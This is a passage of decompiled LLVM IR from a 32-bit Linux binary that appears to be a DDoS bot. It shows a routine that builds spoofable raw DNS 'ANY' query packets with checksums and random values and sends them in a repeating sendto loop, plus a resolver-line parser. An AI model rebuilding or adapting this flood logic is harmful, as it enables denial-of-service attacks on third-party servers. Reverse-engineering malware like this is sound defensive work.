  %v3_80499aa = add i32 %v2_80497cd, 38
  %v4_80499aa = inttoptr i32 %v3_80499aa to i16*
  store i16 %v3_804999d, i16* %v4_80499aa, align 2
  store i32 %v3_8049763, i32* %edx.global-to-local, align 4
  store i32 %v3_8049763, i32* %v3_804986a, align 4
  store i32 %v3_8049781, i32* %eax.global-to-local, align 4
  %v1_80499d3 = add i32 %v3_8049781, 4
  %v2_80499d3 = inttoptr i32 %v1_80499d3 to i32*
  %v3_80499d3 = load i32, i32* %v2_80499d3, align 4
  store i32 %v3_80499d3, i32* %edx.global-to-local, align 4
  %v2_80499d9 = add i32 %v2_80497cd, 16
  %v3_80499d9 = inttoptr i32 %v2_80499d9 to i32*
  store i32 %v3_80499d3, i32* %v3_80499d9, align 4
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  %v3_80499df = load i16, i16* %v2_8049816, align 2
  %v3_80499e3 = udiv i16 %v3_80499df, 2
  %v9_80499e3 = zext i16 %v3_80499e3 to i32
  store i32 %v9_80499e3, i32* %eax.global-to-local, align 4
  store i32 %v2_80497cd, i32* %edx.global-to-local, align 4
  %v2_80499f3 = bitcast i32* %stack_var_-4156 to i16*
  %v3_80499f3 = call i32 @csum(i16* %v2_80499f3, i32 %v9_80499e3)
  %v4_80499f3 = trunc i32 %v3_80499f3 to i16
  %sext14 = mul i32 %v3_80499f3, 65536
  %v1_80499fb = sdiv i32 %sext14, 65536
  store i32 %v1_80499fb, i32* %edx.global-to-local, align 4
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  store i16 %v4_80499f3, i16* %v2_804984f, align 2
  %v2_8049a6e = add i32 %v2_80497cd, 40
  %v2_8049a7d = ptrtoint i32* %stack_var_-4684 to i32
  %v1_8049aac = and i32 %v2_8049a6e, -256
  %v4_8049aaf = inttoptr i32 %v2_8049a6e to i8*
  %v3_8049c0d = add i32 %v2_80497cd, 24
  %v4_8049c0d = inttoptr i32 %v3_8049c0d to i16*
  br label %dec_label_pc_8049a12

dec_label_pc_8049a12:                             ; preds = %dec_label_pc_8049ca6, %dec_label_pc_80497b7
  %stack_var_-20.0 = phi i16 [ 0, %dec_label_pc_80497b7 ], [ %v23_8049bd9, %dec_label_pc_8049ca6 ]
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_80497b7 ], [ %v4_8049ca6, %dec_label_pc_8049ca6 ]
  %stack_var_-52.0 = phi i32 [ %v3_8049781, %dec_label_pc_80497b7 ], [ %v3_8049a2f, %dec_label_pc_8049ca6 ]
  %v12_8049a12 = icmp eq i32 %stack_var_-24.0, 2
  %v1_8049a16 = icmp eq i1 %v12_8049a12, false
  br i1 %v1_8049a16, label %dec_label_pc_8049a2c, label %dec_label_pc_8049a18

dec_label_pc_8049a18:                             ; preds = %dec_label_pc_8049a12
  %v0_8049a18 = load i32, i32* @esp, align 4
  %v1_8049a1b = add i32 %v0_8049a18, -16
  %v2_8049a1b = inttoptr i32 %v1_8049a1b to i32*
  store i32 100, i32* %v2_8049a1b, align 4
  %v2_8049a1d = sext i16 %stack_var_-20.0 to i64
  %v3_8049a1d = call i32 @usleep(i64 %v2_8049a1d)
  store i32 %v3_8049a1d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049a2c

dec_label_pc_8049a2c:                             ; preds = %dec_label_pc_8049a12, %dec_label_pc_8049a18
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049a12 ], [ 0, %dec_label_pc_8049a18 ]
  store i32 %stack_var_-52.0, i32* %eax.global-to-local, align 4
  %v1_8049a2f = add i32 %stack_var_-52.0, 532
  %v2_8049a2f = inttoptr i32 %v1_8049a2f to i32*
  %v3_8049a2f = load i32, i32* %v2_8049a2f, align 4
  %v4_8049a38 = sext i16 %stack_var_-20.0 to i32
  %v1_8049a3b = add nsw i32 %v4_8049a38, 256
  %v5_8049a45 = add nsw i32 %v4_8049a38, 40
  store i32 %v5_8049a45, i32* %edx.global-to-local, align 4
  %v2_8049a50 = add i32 %v5_8049a45, %v2_80497cd
  %v1_8049a52 = inttoptr i32 %v2_8049a50 to i8*
  store i32 %v2_8049a50, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8049a55 = and i32 %v2_8049a50, -256
  store i32 %v1_8049a55, i32* %eax.global-to-local, align 4
  %v5_8049a57 = call i8* @_memset(i8* %v1_8049a52, i32 %v1_8049a55, i32 %v1_8049a3b)
  store i32 40, i32* %edx.global-to-local, align 4
  %v1_8049a76 = add i32 %v3_8049a2f, 16
  %v0_8049a79 = load i32, i32* @esp, align 4
  %v2_8049a7c = add i32 %v0_8049a79, -12
  %v3_8049a7c = inttoptr i32 %v2_8049a7c to i32*
  store i32 %v1_8049a76, i32* %v3_8049a7c, align 4
  store i32 %v2_8049a7d, i32* @eax, align 4
  %v2_8049a83 = add i32 %v0_8049a79, -16
  %v3_8049a83 = inttoptr i32 %v2_8049a83 to i32*
  store i32 %v2_8049a7d, i32* %v3_8049a83, align 4
  %v4_8049a84 = call i32 @strcpy(i8* null, i32 %v2_8049a6e)
  %v0_8049a89 = load i32, i32* @esp, align 4
  store i32 %v2_8049a7d, i32* %eax.global-to-local, align 4
  %v2_8049a92 = add i32 %v0_8049a89, 12
  %v3_8049a92 = inttoptr i32 %v2_8049a92 to i32*
  store i32 %v2_8049a7d, i32* %v3_8049a92, align 4
  %v5_8049a93 = add i32 %v0_8049a89, 8
  %v6_8049a93 = inttoptr i32 %v5_8049a93 to i32*
  store i32 %v2_8049a6e, i32* %v6_8049a93, align 4
  %v0_8049a96 = call i32 @ChangetoDnsNameFormat()
  store i32 %v1_8049aac, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v3_8049ab5 = call i32 @_strlen(i8* %v4_8049aaf)
  %tmp76 = mul i32 %v3_8049ab5, 65536
  %sext = add i32 %tmp76, 65536
  %v4_8049ac8 = sdiv i32 %sext, 65536
  %v5_8049acb = add nsw i32 %v4_8049ac8, 40
  store i32 %v5_8049acb, i32* %edx.global-to-local, align 4
  %v2_8049ad6 = add i32 %v5_8049acb, %v2_80497cd
  store i32 %v2_8049ad6, i32* %eax.global-to-local, align 4
  %v5_8049ad8 = inttoptr i32 %v2_8049ad6 to i16*
  %v0_8049adb = load i32, i32* @esp, align 4
  %v1_8049ade = add i32 %v0_8049adb, -16
  %v2_8049ade = inttoptr i32 %v1_8049ade to i32*
  store i32 255, i32* %v2_8049ade, align 4
  %v2_8049ae3 = call i32 @htons(i32 %v4_8049ac8)
  %v3_8049ae3 = trunc i32 %v2_8049ae3 to i16
  %sext16 = mul i32 %v2_8049ae3, 65536
  %v1_8049aeb = sdiv i32 %sext16, 65536
  store i32 %v1_8049aeb, i32* %edx.global-to-local, align 4
  store i32 %v2_8049ad6, i32* %eax.global-to-local, align 4
  store i16 %v3_8049ae3, i16* %v5_8049ad8, align 2
  %v0_8049af3 = load i32, i32* @esp, align 4
  %v1_8049af6 = add i32 %v0_8049af3, -16
  %v2_8049af6 = inttoptr i32 %v1_8049af6 to i32*
  store i32 1, i32* %v2_8049af6, align 4
  %v2_8049af8 = call i32 @htons(i32 %v2_8049ad6)
  %v3_8049af8 = trunc i32 %v2_8049af8 to i16
  %sext17 = mul i32 %v2_8049af8, 65536
  %v1_8049b00 = sdiv i32 %sext17, 65536
  store i32 %v1_8049b00, i32* %edx.global-to-local, align 4
  %v3_8049b05 = add i32 %v2_8049ad6, 2
  %v4_8049b05 = inttoptr i32 %v3_8049b05 to i16*
  store i16 %v3_8049af8, i16* %v4_8049b05, align 2
  %sext7 = add i32 %tmp76, 327680
  %v4_8049b12 = sdiv i32 %sext7, 65536
  %v0_8049b18 = load i32, i32* @ebp, align 4
  %v2_8049b18 = add nsw i32 %v4_8049b12, -4112
  %v3_8049b18 = add i32 %v2_8049b18, %v0_8049b18
  %v4_8049b18 = inttoptr i32 %v3_8049b18 to i8*
  store i8 0, i8* %v4_8049b18, align 1
  %v0_8049b27 = load i32, i32* @ebp, align 4
  %v2_8049b27 = add nsw i32 %v4_8049b12, -4111
  %v3_8049b27 = add i32 %v2_8049b27, %v0_8049b27
  %v4_8049b27 = inttoptr i32 %v3_8049b27 to i8*
  store i8 0, i8* %v4_8049b27, align 1
  %v0_8049b38 = load i32, i32* @ebp, align 4
  %v2_8049b38 = add nsw i32 %v4_8049b12, -4110
  %v3_8049b38 = add i32 %v2_8049b38, %v0_8049b38
  %v4_8049b38 = inttoptr i32 %v3_8049b38 to i8*
  store i8 41, i8* %v4_8049b38, align 1
  %v0_8049b49 = load i32, i32* @ebp, align 4
  %v2_8049b49 = add nsw i32 %v4_8049b12, -4109
  %v3_8049b49 = add i32 %v2_8049b49, %v0_8049b49
  %v4_8049b49 = inttoptr i32 %v3_8049b49 to i8*
  store i8 35, i8* %v4_8049b49, align 1
  %v0_8049b5a = load i32, i32* @ebp, align 4
  %v2_8049b5a = add nsw i32 %v4_8049b12, -4108
  %v3_8049b5a = add i32 %v2_8049b5a, %v0_8049b5a
  %v4_8049b5a = inttoptr i32 %v3_8049b5a to i8*
  store i8 40, i8* %v4_8049b5a, align 1
  %v0_8049b6b = load i32, i32* @ebp, align 4
  %v2_8049b6b = add nsw i32 %v4_8049b12, -4107
  %v3_8049b6b = add i32 %v2_8049b6b, %v0_8049b6b
  %v4_8049b6b = inttoptr i32 %v3_8049b6b to i8*
  store i8 0, i8* %v4_8049b6b, align 1
  %v0_8049b7c = load i32, i32* @ebp, align 4
  %v2_8049b7c = add nsw i32 %v4_8049b12, -4106
  %v3_8049b7c = add i32 %v2_8049b7c, %v0_8049b7c
  %v4_8049b7c = inttoptr i32 %v3_8049b7c to i8*
  store i8 0, i8* %v4_8049b7c, align 1
  %v0_8049b8d = load i32, i32* @ebp, align 4
  %v2_8049b8d = add nsw i32 %v4_8049b12, -4105
  %v3_8049b8d = add i32 %v2_8049b8d, %v0_8049b8d
  %v4_8049b8d = inttoptr i32 %v3_8049b8d to i8*
  store i8 0, i8* %v4_8049b8d, align 1
  %v0_8049b9e = load i32, i32* @ebp, align 4
  %v2_8049b9e = add nsw i32 %v4_8049b12, -4104
  %v3_8049b9e = add i32 %v2_8049b9e, %v0_8049b9e
  %v4_8049b9e = inttoptr i32 %v3_8049b9e to i8*
  store i8 0, i8* %v4_8049b9e, align 1
  %v0_8049baf = load i32, i32* @ebp, align 4
  %v2_8049baf = add nsw i32 %v4_8049b12, -4103
  %v3_8049baf = add i32 %v2_8049baf, %v0_8049baf
  %v4_8049baf = inttoptr i32 %v3_8049baf to i8*
  store i8 0, i8* %v4_8049baf, align 1
  %v0_8049bc0 = load i32, i32* @ebp, align 4
  %v2_8049bc0 = add nsw i32 %v4_8049b12, -4102
  %v3_8049bc0 = add i32 %v2_8049bc0, %v0_8049bc0
  %v4_8049bc0 = inttoptr i32 %v3_8049bc0 to i8*
  store i8 0, i8* %v4_8049bc0, align 1
  %v0_8049bd1 = load i32, i32* @ebp, align 4
  %v2_8049bd1 = add nsw i32 %v4_8049b12, -4101
  %v3_8049bd1 = add i32 %v2_8049bd1, %v0_8049bd1
  %v4_8049bd1 = inttoptr i32 %v3_8049bd1 to i8*
  store i8 0, i8* %v4_8049bd1, align 1
  %v5_8049bd9 = add nsw i32 %v4_8049b12, 11
  store i32 %v3_8049a2f, i32* %eax.global-to-local, align 4
  %v1_8049be0 = add i32 %v3_8049a2f, 4
  %v2_8049be0 = inttoptr i32 %v1_8049be0 to i32*
  %v3_8049be0 = load i32, i32* %v2_8049be0, align 4
  store i32 %v3_8049be0, i32* %v3_80499d9, align 4
  store i32 40, i32* %edx.global-to-local, align 4
  %sext31 = mul i32 %v5_8049bd9, 65536
  %v4_8049bee = sdiv i32 %sext31, 65536
  %v2_8049bf1 = add nsw i32 %v4_8049bee, 40
  %v1_8049bf4 = add nsw i32 %v4_8049bee, 20
  %v1_8049bf7 = urem i32 %v1_8049bf4, 65536
  store i32 %v1_8049bf7, i32* %eax.global-to-local, align 4
  %v0_8049bfc = load i32, i32* @esp, align 4
  %v2_8049bff = add i32 %v0_8049bfc, -16
  %v3_8049bff = inttoptr i32 %v2_8049bff to i32*
  store i32 %v1_8049bf7, i32* %v3_8049bff, align 4
  %v2_8049c00 = call i32 @htons(i32 %v4_8049bee)
  %v3_8049c00 = trunc i32 %v2_8049c00 to i16
  store i16 %v3_8049c00, i16* %v4_8049c0d, align 4
  store i32 %v2_8049bf1, i32* %edx.global-to-local, align 4
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  %v1_8049c1e = trunc i32 %v2_8049bf1 to i16
  store i16 %v1_8049c1e, i16* %v2_8049816, align 2
  %v2_8049c22 = call i32 @rand_cmwc(i32 %v4_8049bee)
  %v1_8049c27 = urem i32 %v2_8049c22, 65536
  store i32 %v1_8049c27, i32* %eax.global-to-local, align 4
  %v0_8049c2c = load i32, i32* @esp, align 4
  %v2_8049c2f = add i32 %v0_8049c2c, -16
  %v3_8049c2f = inttoptr i32 %v2_8049c2f to i32*
  store i32 %v1_8049c27, i32* %v3_8049c2f, align 4
  %v2_8049c30 = call i32 @htons(i32 %v4_8049bee)
  %v3_8049c30 = trunc i32 %v2_8049c30 to i16
  %sext37 = mul i32 %v2_8049c30, 65536
  %v1_8049c38 = sdiv i32 %sext37, 65536
  store i32 %v1_8049c38, i32* %edx.global-to-local, align 4
  store i16 %v3_8049c30, i16* %v5_8049883, align 4
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  %v3_8049c43 = load i16, i16* %v2_8049816, align 2
  %v3_8049c47 = udiv i16 %v3_8049c43, 2
  %v9_8049c47 = zext i16 %v3_8049c47 to i32
  store i32 %v9_8049c47, i32* %eax.global-to-local, align 4
  store i32 %v2_80497cd, i32* %edx.global-to-local, align 4
  %v1_8049c55 = load i32, i32* @esp, align 4
  %v2_8049c55 = add i32 %v1_8049c55, -4
  %v3_8049c55 = inttoptr i32 %v2_8049c55 to i32*
  store i32 %v9_8049c47, i32* %v3_8049c55, align 4
  %v2_8049c56 = add i32 %v1_8049c55, -8
  %v3_8049c56 = inttoptr i32 %v2_8049c56 to i32*
  store i32 %v2_80497cd, i32* %v3_8049c56, align 4
  %v3_8049c57 = inttoptr i32 %v4_8049bee to i16*
  %v4_8049c57 = call i32 @csum(i16* %v3_8049c57, i32 %v2_8049a6e)
  %v5_8049c57 = trunc i32 %v4_8049c57 to i16
  %sext39 = mul i32 %v4_8049c57, 65536
  %v1_8049c5f = sdiv i32 %sext39, 65536
  store i32 %v1_8049c5f, i32* %edx.global-to-local, align 4
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  store i16 %v5_8049c57, i16* %v2_804984f, align 2
  %v0_8049c82.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049c71

dec_label_pc_8049c71:                             ; preds = %dec_label_pc_8049a2c, %dec_label_pc_8049c71
  %v0_8049c82 = phi i32 [ %v0_8049c82.pre, %dec_label_pc_8049a2c ], [ %v1_8049c9a, %dec_label_pc_8049c71 ]
  %storemerge73 = phi i32 [ 0, %dec_label_pc_8049a2c ], [ %v4_8049c9d, %dec_label_pc_8049c71 ]
  store i32 %v3_8049a2f, i32* %edx.global-to-local, align 4
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  %v3_8049c79 = load i16, i16* %v2_8049816, align 2
  %v4_8049c79 = zext i16 %v3_8049c79 to i32
  store i32 %v4_8049c79, i32* %eax.global-to-local, align 4
  %v1_8049c85 = add i32 %v0_8049c82, -12
  %v2_8049c85 = inttoptr i32 %v1_8049c85 to i32*
  store i32 16, i32* %v2_8049c85, align 4
  %v0_8049c87 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049c87 = add i32 %v0_8049c82, -16
  %v3_8049c87 = inttoptr i32 %v2_8049c87 to i32*
  store i32 %v0_8049c87, i32* %v3_8049c87, align 4
  %v1_8049c88 = add i32 %v0_8049c82, -20
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  store i32 0, i32* %v2_8049c88, align 4
  %v0_8049c8a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c8a = add i32 %v0_8049c82, -24
  %v3_8049c8a = inttoptr i32 %v2_8049c8a to i32*
  store i32 %v0_8049c8a, i32* %v3_8049c8a, align 4
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  %v2_8049c91 = add i32 %v0_8049c82, -28
  %v3_8049c91 = inttoptr i32 %v2_8049c91 to i32*
  store i32 %v2_80497cd, i32* %v3_8049c91, align 4
  %v5_8049c92 = add i32 %v0_8049c82, -32
  %v6_8049c92 = inttoptr i32 %v5_8049c92 to i32*
  store i32 %v4_804979c, i32* %v6_8049c92, align 4
  %v7_8049c95 = load i32, i32* %stack_var_-8, align 4
  %v8_8049c95 = call i32 @sendto(i32 %storemerge73, i32 %stack_var_-24.1, i32 %v4_8049bee, i32 %v2_8049a6e, i32 %v2_8049ad6, i32 %v7_8049c95)
  store i32 %v8_8049c95, i32* %eax.global-to-local, align 4
  %v0_8049c9a = load i32, i32* @esp, align 4
  %v1_8049c9a = add i32 %v0_8049c9a, 32
  %v4_8049c9d = add nuw nsw i32 %storemerge73, 1
  %exitcond = icmp eq i32 %v4_8049c9d, 25
  br i1 %exitcond, label %dec_label_pc_8049ca6, label %dec_label_pc_8049c71

dec_label_pc_8049ca6:                             ; preds = %dec_label_pc_8049c71
  %v23_8049bd9 = trunc i32 %v5_8049bd9 to i16
  %v4_8049ca6 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_8049a12

dec_label_pc_8049cae:                             ; preds = %entry
  %v3_8049cae = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049cae, i32* @edi, align 4
  ret i32 %v1_804973d

; uselistorder directives
  uselistorder i32 %storemerge73, { 1, 0 }
  uselistorder i32 %v0_8049c82, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v9_8049c47, { 1, 0 }
  uselistorder i32 %v1_8049c27, { 1, 0 }
  uselistorder i32 %v1_8049bf7, { 1, 0 }
  uselistorder i32 %v2_8049bf1, { 1, 0 }
  uselistorder i32 %v4_8049bee, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8049bd9, { 1, 0 }
  uselistorder i32 %v4_8049b12, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v4_8049ac8, { 1, 0 }
  uselistorder i32 %v3_8049a2f, { 0, 3, 2, 4, 1 }
  uselistorder i32 %stack_var_-24.1, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32 %stack_var_-24.0, { 1, 0 }
  uselistorder i16 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v2_8049a6e, { 0, 1, 4, 5, 3, 2 }
  uselistorder i8* %v2_8049937, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v1_804992e, { 1, 0 }
  uselistorder i8* %v2_80498fb, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v1_80498df, { 1, 0 }
  uselistorder i32 %v1_8049889, { 1, 0 }
  uselistorder i32 %v2_80497cd, { 32, 33, 2, 3, 34, 35, 4, 5, 0, 1, 20, 21, 6, 36, 7, 8, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 37 }
  uselistorder i32 %v3_8049781, { 0, 2, 1 }
  uselistorder i32 %v3_8049763, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder i32 %tmp59, { 1, 0, 3, 2, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 57, 52, 53, 54, 55, 56, 58 }
  uselistorder label %dec_label_pc_8049c71, { 1, 0 }
  uselistorder label %dec_label_pc_8049a2c, { 1, 0 }
  uselistorder label %dec_label_pc_80497b7, { 1, 0 }
}

define i32 @ParseResolverLine(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-768 = alloca i32, align 4
  %stack_var_-568 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-1079 = alloca i32, align 4
  %stack_var_-567 = alloca i32, align 4
  %stack_var_-55 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049cb6 = load i32, i32* @edi, align 4
  %v0_8049cb7 = load i32, i32* @ebx, align 4
  store i32 %v0_8049cb7, i32* %stack_var_-12, align 4
  %v2_8049cbe = load i32, i32* @eax, align 4
  %v3_8049cbe = and i32 %v2_8049cbe, -256
  store i32 %v3_8049cbe, i32* %stack_var_-56, align 4
  %v2_8049cc6 = ptrtoint i32* %stack_var_-55 to i32
  %tmp26 = bitcast i32* %stack_var_-55 to i8*
  store i32 %v2_8049cc6, i32* @edi, align 4
  store i32 %v3_8049cbe, i32* %eax.global-to-local, align 4
  %v5_8049cd1 = call i8* @_memset(i8* %tmp26, i32 %v3_8049cbe, i32 31)
  store i32 %v3_8049cbe, i32* %stack_var_-568, align 4
  %v2_8049cde = ptrtoint i32* %stack_var_-567 to i32
  store i32 %v2_8049cde, i32* %edx.global-to-local, align 4
  store i32 511, i32* %eax.global-to-local, align 4
  %v3_8049cf0 = bitcast i32* %stack_var_-567 to i8*
  %v4_8049cf0 = call i32 @__GI_memset(i8* %v3_8049cf0, i32 0, i32 511)
  %v2_8049d03 = ptrtoint i32* %stack_var_-1079 to i32
  store i32 %v2_8049d03, i32* %edx.global-to-local, align 4
  store i32 511, i32* %eax.global-to-local, align 4
  %v3_8049d15 = bitcast i32* %stack_var_-1079 to i8*
  %v4_8049d15 = call i32 @__GI_memset(i8* %v3_8049d15, i32 0, i32 511)
  store i32 %v4_8049d15, i32* %eax.global-to-local, align 4
  %v4_8049dcb = ptrtoint i8* %arg1 to i32
  %v1_8049dd9 = and i32 %v4_8049dcb, -256
  %v2_8049d93 = ptrtoint i32* %stack_var_-568 to i32
  %v2_8049da4 = ptrtoint i32* %stack_var_-768 to i32
  %v4_8049da7 = bitcast i32* %stack_var_-568 to i8*
  %v2_8049d5f = ptrtoint i32* %stack_var_-56 to i32
  %v2_8049d6d = ptrtoint i32* %stack_var_-256 to i32
  %v4_8049d70 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_8049dc8

dec_label_pc_8049d30:                             ; preds = %dec_label_pc_8049dc8
  %v6_8049d33 = add i32 %storemerge, %v4_8049dcb
  store i32 %v6_8049d33, i32* %eax.global-to-local, align 4
  %v1_8049d36 = inttoptr i32 %v6_8049d33 to i8*
  %v2_8049d36 = load i8, i8* %v1_8049d36, align 1
  %v3_8049d36 = zext i8 %v2_8049d36 to i32
  %v5_8049d36 = and i32 %v6_8049d33, -256
  %v6_8049d36 = or i32 %v3_8049d36, %v5_8049d36
  store i32 %v6_8049d36, i32* %eax.global-to-local, align 4
  %v7_8049d38 = icmp eq i8 %v2_8049d36, 32
  br i1 %v7_8049d38, label %dec_label_pc_8049d54, label %dec_label_pc_8049d3c

dec_label_pc_8049d3c:                             ; preds = %dec_label_pc_8049d30
  store i32 %v6_8049d33, i32* %eax.global-to-local, align 4
  %v2_8049d42 = load i8, i8* %v1_8049d36, align 1
  %v3_8049d42 = zext i8 %v2_8049d42 to i32
  %v6_8049d42 = or i32 %v3_8049d42, %v5_8049d36
  store i32 %v6_8049d42, i32* %eax.global-to-local, align 4
  %v10_8049d44 = icmp eq i8 %v2_8049d42, 10
  br i1 %v10_8049d44, label %dec_label_pc_8049d54, label %dec_label_pc_8049d48

dec_label_pc_8049d48:                             ; preds = %dec_label_pc_8049d3c
  store i32 %v6_8049d33, i32* %eax.global-to-local, align 4
  %v2_8049d4e = load i8, i8* %v1_8049d36, align 1
  %v3_8049d4e = zext i8 %v2_8049d4e to i32
  %v6_8049d4e = or i32 %v3_8049d4e, %v5_8049d36
  store i32 %v6_8049d4e, i32* %eax.global-to-local, align 4
  %v10_8049d50 = icmp eq i8 %v2_8049d4e, 9
  %v1_8049d52 = icmp eq i1 %v10_8049d50, false
  br i1 %v1_8049d52, label %dec_label_pc_8049d59, label %dec_label_pc_8049d54

dec_label_pc_8049d54:                             ; preds = %dec_label_pc_8049d48, %dec_label_pc_8049d3c, %dec_label_pc_8049d30
  %v4_8049d54 = add i32 %stack_var_-20.1, 1
  br label %dec_label_pc_8049dc5

dec_label_pc_8049d59:                             ; preds = %dec_label_pc_8049d48
  %v4_8049d59 = icmp eq i32 %stack_var_-20.1, 0
  %v1_8049d5d = icmp eq i1 %v4_8049d59, false
  br i1 %v1_8049d5d, label %dec_label_pc_8049d8d, label %dec_label_pc_8049d5f

dec_label_pc_8049d5f:                             ; preds = %dec_label_pc_8049d59
  store i32 %v2_8049d6d, i32* %eax.global-to-local, align 4
  %v3_8049d76 = call i32 @_strlen(i8* %v4_8049d70)
  %v4_8049d76 = mul i32 %v3_8049d76, -1
  %v1_8049d7c = sub i32 0, %v4_8049d76
  store i32 %v1_8049d7c, i32* %edx.global-to-local, align 4
  store i32 %v6_8049d33, i32* %eax.global-to-local, align 4
  %v2_8049d85 = load i8, i8* %v1_8049d36, align 1
  %v3_8049d85 = zext i8 %v2_8049d85 to i32
  %v6_8049d85 = or i32 %v3_8049d85, %v5_8049d36
  store i32 %v6_8049d85, i32* %eax.global-to-local, align 4
  %v2_8049d87 = load i32, i32* @ebp, align 4
  %v4_8049d87 = sub i32 -52, %v4_8049d76
  %v5_8049d87 = add i32 %v4_8049d87, %v2_8049d87
  %v6_8049d87 = inttoptr i32 %v5_8049d87 to i8*
  store i8 %v2_8049d85, i8* %v6_8049d87, align 1
  br label %dec_label_pc_8049dc5

dec_label_pc_8049d8d:                             ; preds = %dec_label_pc_8049d59
  %v12_8049d8d = icmp eq i32 %stack_var_-20.1, 1
  %v1_8049d91 = icmp eq i1 %v12_8049d8d, false
  br i1 %v1_8049d91, label %dec_label_pc_8049dc5, label %dec_label_pc_8049d93

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049d8d
  store i32 %v2_8049da4, i32* %eax.global-to-local, align 4
  %v3_8049dad = call i32 @_strlen(i8* %v4_8049da7)
  %v4_8049dad = mul i32 %v3_8049dad, -1
  %v1_8049db3 = sub i32 0, %v4_8049dad
  store i32 %v1_8049db3, i32* %edx.global-to-local, align 4
  store i32 %v6_8049d33, i32* %eax.global-to-local, align 4
  %v2_8049dbc = load i8, i8* %v1_8049d36, align 1
  %v3_8049dbc = zext i8 %v2_8049dbc to i32
  %v6_8049dbc = or i32 %v3_8049dbc, %v5_8049d36
  store i32 %v6_8049dbc, i32* %eax.global-to-local, align 4
  %v2_8049dbe = load i32, i32* @ebp, align 4
  %v4_8049dbe = sub i32 -564, %v4_8049dad
  %v5_8049dbe = add i32 %v4_8049dbe, %v2_8049dbe
  %v6_8049dbe = inttoptr i32 %v5_8049dbe to i8*
  store i8 %v2_8049dbc, i8* %v6_8049dbe, align 1
  br label %dec_label_pc_8049dc5

dec_label_pc_8049dc5:                             ; preds = %dec_label_pc_8049d8d, %dec_label_pc_8049d5f, %dec_label_pc_8049d54, %dec_label_pc_8049d93
  %stack_var_-20.0 = phi i32 [ %v4_8049d54, %dec_label_pc_8049d54 ], [ %stack_var_-20.1, %dec_label_pc_8049d8d ], [ %stack_var_-20.1, %dec_label_pc_8049d93 ], [ %stack_var_-20.1, %dec_label_pc_8049d5f ]
  %v4_8049dc5 = add i32 %storemerge, 1
  br label %dec_label_pc_8049dc8

dec_label_pc_8049dc8:                             ; preds = %entry, %dec_label_pc_8049dc5
  %stack_var_-20.1 = phi i32 [ 0, %entry ], [ %stack_var_-20.0, %dec_label_pc_8049dc5 ]
  %storemerge = phi i32 [ 0, %entry ], [ %v4_8049dc5, %dec_label_pc_8049dc5 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  store i32 %v1_8049dd9, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8049dcb, i32* @edi, align 4
  %v3_8049de2 = call i32 @_strlen(i8* %arg1)
  %v4_8049de2 = mul i32 %v3_8049de2, -1
  %v5_8049de2 = add i32 %v4_8049de2, -2
  store i32 %v5_8049de2, i32* @ecx, align 4
  %v1_8049de8 = sub i32 0, %v4_8049de2
  store i32 %v1_8049de8, i32* %eax.global-to-local, align 4
  %v0_8049de9 = load i32, i32* %edx.global-to-local, align 4
  %v7_8049de9 = icmp ult i32 %v0_8049de9, %v1_8049de8
  br i1 %v7_8049de9, label %dec_label_pc_8049d30, label %dec_label_pc_8049df1

dec_label_pc_8049df1:                             ; preds = %dec_label_pc_8049dc8
  %v0_8049df1 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_8049df1, i32* %eax.global-to-local, align 4
  %v1_8049df6 = icmp eq i32 %v0_8049df1, 0
  %v1_8049df8 = icmp eq i1 %v1_8049df6, false
  %v1_8049ebb = call i32 @malloc(i32 540)
  store i32 %v1_8049ebb, i32* %eax.global-to-local, align 4
  br i1 %v1_8049df8, label %dec_label_pc_8049eb3, label %dec_label_pc_8049dfe

dec_label_pc_8049dfe:                             ; preds = %dec_label_pc_8049df1
  store i32 %v1_8049ebb, i32* @global_var_807e520.80, align 32
  store i32 %v1_8049ebb, i32* %eax.global-to-local, align 4
  %v1_8049e18 = inttoptr i32 %v1_8049ebb to i32*
